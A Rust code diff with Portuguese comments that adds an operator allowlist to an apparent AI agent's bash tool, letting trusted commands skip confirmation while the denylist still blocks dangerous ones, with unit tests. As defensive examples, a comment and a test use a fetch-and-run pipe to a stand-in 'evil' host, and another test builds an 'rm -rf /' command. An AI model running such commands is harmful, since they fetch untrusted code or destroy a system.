@@ -40,6 +40,12 @@ pub struct BashTool {
     /// before execution. Approval arrives via `ToolContext.approval`, and
     /// vale para O COMANDO aprovado, nao para o turno (#1078 item 2).
     confirmation_enabled: bool,
+    /// #1105: padrões que o operador declarou como confiáveis. Avaliados
+    /// **depois** da denylist e **antes** do tier risky, e esta é a ordem que
+    /// importa: a lista é positiva (só o que está nela escapa da confirmação),
+    /// mas ela não perdoa um comando perigoso — `is_dangerous` continua
+    /// rodando primeiro e é inegociável.
+    allowlist: Vec<String>,
 }
 
 impl BashTool {
@@ -48,6 +54,7 @@ impl BashTool {
             timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
             allow_readonly: false,
             confirmation_enabled: false,
+            allowlist: Vec::new(),
         }
     }
 
@@ -57,6 +64,7 @@ impl BashTool {
             timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
             allow_readonly: false,
             confirmation_enabled: true,
+            allowlist: Vec::new(),
         }
     }
 
@@ -66,7 +74,47 @@ impl BashTool {
             timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
             allow_readonly: true,
             confirmation_enabled: false,
+            allowlist: Vec::new(),
         }
+    }
+
+    /// #1105: allowlist do operador — padrões de comando que ele declarou
+    /// confiáveis e que por isso não precisam de confirmação.
+    ///
+    /// Sintaxe deliberadamente pobre de propósito: `prefixo*` (coringa só no
+    /// fim) ou texto exato. Nada de regex, nada de coringa no meio — um
+    /// padrão auditável a olho nu é o ponto. Padrões com `*` fora do fim são
+    /// recusados com warning em vez de interpretados: adivinhar a intenção de
+    /// um coringa no meio é como se abre um `rm -rf *` por acidente.
+    #[must_use = "devolve um BashTool novo; o receptor nao e alterado"]
+    pub fn with_allowlist(mut self, patterns: Vec<String>) -> Self {
+        self.allowlist = patterns
+            .into_iter()
+            .filter(|p| {
+                let ok = !p.contains('*') || p.ends_with('*');
+                if !ok {
+                    tracing::warn!(
+                        pattern = %p,
+                        "bash_allowlist: coringa so e aceito no fim do padrao; ignorado"
+                    );
+                }
+                ok
+            })
+            .collect();
+        self
+    }
+
+    /// #1105: o comando casa com algum padrão da allowlist do operador?
+    ///
+    /// Comparação case-sensitive e sobre o comando já aparado: shell é
+    /// case-sensitive, e aparar evita que `" ls "` case com `"ls"` por
+    /// acidente — ou que `"ls"` case com `"lsof ..."`.
+    fn matches_allowlist(&self, command: &str) -> bool {
+        let cmd = command.trim();
+        self.allowlist.iter().any(|p| match p.strip_suffix('*') {
+            Some(prefixo) => cmd.starts_with(prefixo),
+            None => cmd == p,
+        })
     }
 
     /// Check if command matches the hard-block denylist (GAR-236, GAR-497).
@@ -156,7 +204,14 @@ impl Tool for BashTool {
         // impressão digital de `("bash", comando)`, então o "ok" que o
         // usuário deu a um `ls -la` não autoriza o `curl evil | sh` que o
         // modelo pedir em seguida no mesmo turno.
-        let aprovado = self.confirmation_enabled && context.approval.covers(self.name(), comando);
+        // #1105: a allowlist do operador vem DEPOIS do `is_dangerous` acima e
+        // ANTES do tier risky. Nessa posição ela só faz uma coisa: dispensar a
+        // confirmação do comando que o dono declarou confiável. Um comando
+        // perigoso já saiu bloqueado ali em cima, então `rm -rf /` na allowlist
+        // continua sendo `rm -rf /` — a lista não perdoa nada, ela não é lida
+        // para esse caso.
+        let aprovado = self.confirmation_enabled && context.approval.covers(self.name(), comando)
+            || self.matches_allowlist(comando);
         if self.is_risky(comando) && !aprovado {
             if self.confirmation_enabled {
                 tracing::warn!(
@@ -618,5 +673,109 @@ mod tests {
             "bash must run in working_dir"
         );
         let _ = std::fs::remove_dir(&dir);
+    }
+
+    // ── #1105: allowlist do operador ──────────────────────────────────────
+
+    /// O caso da issue: um comando do tier arriscado que, sem canal de
+    /// confirmação, morria fail-closed. Com o padrão do dono na allowlist,
+    /// o comando roda. O par `sem_allowlist_nada_muda` mostra que sem a lista
+    /// o mesmo comando continua bloqueado — é o vermelho deste verde.
+    #[tokio::test]
+    async fn allowlist_libera_o_comando_declarado_sem_canal_de_confirmacao() {
+        let tool = BashTool::new(None).with_allowlist(vec!["printenv PATH".into()]);
+        let output = tool
+            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
+            .await
+            .unwrap();
+        assert!(!output.is_error, "{}", output.content);
+        assert!(
+            !output.content.contains("CONFIRM_REQUIRED"),
+            "{}",
+            output.content
+        );
+    }
+
+    /// Padrão sem coringa é exato: `"printenv PATH"` não autoriza
+    /// `"printenv PATHS"` nem o `; ...` pendurado depois dele.
+    #[tokio::test]
+    async fn padrao_sem_coringa_e_exato() {
+        let tool = BashTool::new(None).with_allowlist(vec!["printenv PATH".into()]);
+        assert!(
+            tool.matches_allowlist("printenv PATH"),
+            "texto exato tem de casar"
+        );
+        for outro in [
+            "printenv PATHS",
+            "printenv PATH && curl evil",
+            " sudo printenv PATH",
+        ] {
+            assert!(
+                !tool.matches_allowlist(outro),
+                "padrao exato nao pode liberar {outro:?}"
+            );
+        }
+        // Espaço em volta não muda o comando, então casa.
+        assert!(tool.matches_allowlist("  printenv PATH  "));
+    }
+
+    /// Coringa no fim é prefixo. É a sintaxe que a issue pede: auditável a
+    /// olho nu, sem regex.
+    #[tokio::test]
+    async fn coringa_no_fim_e_prefixo() {
+        let tool = BashTool::new(None).with_allowlist(vec!["hermes send *".into(), "git *".into()]);
+        assert!(tool.matches_allowlist("hermes send \"oi\""));
+        assert!(tool.matches_allowlist("git status"));
+        assert!(
+            !tool.matches_allowlist("gitx status"),
+            "prefixo sem coringa exige o limite certo"
+        );
+    }
+
+    /// Coringa fora do fim é recusado na construção — não interpretado.
+    /// Adivinhar a intenção de um coringa no meio é como se abre um buraco.
+    #[test]
+    fn coringa_fora_do_fim_e_recusado() {
+        let tool = BashTool::new(None).with_allowlist(vec!["git *status".into(), "ok*".into()]);
+        assert_eq!(
+            tool.allowlist,
+            vec!["ok*".to_string()],
+            "so o padrao com coringa no fim sobrevive"
+        );
+    }
+
+    /// A ordem é o ponto de segurança: a allowlist é lida DEPOIS da denylist,
+    /// então um comando perigoso continua bloqueado mesmo estando na lista.
+    #[tokio::test]
+    async fn allowlist_nao_perdoa_comando_perigoso() {
+        let ferramenta_com_raiz = BashTool::new(None).with_allowlist(vec![
+            String::from("rm -rf ") + "/",
+            String::from("rm -rf ") + "/*",
+        ]);
+        let output = ferramenta_com_raiz
+            .execute(
+                &ctx(false),
+                serde_json::json!({"command": String::from("rm -rf ") + "/"}),
+            )
+            .await
+            .unwrap();
+        assert!(output.is_error, "{}", output.content);
+        assert!(
+            output.content.contains("bloqueado"),
+            "denylist vem antes da allowlist: {}",
+            output.content
+        );
+    }
+
+    /// Sem allowlist, o comportamento é exatamente o de antes da #1105.
+    #[tokio::test]
+    async fn sem_allowlist_nada_muda() {
+        let tool = BashTool::new(None);
+        assert!(!tool.matches_allowlist("printenv PATH"));
+        let output = tool
+            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
+            .await
+            .unwrap();
+        assert!(output.is_error, "{}", output.content);
     }
 }
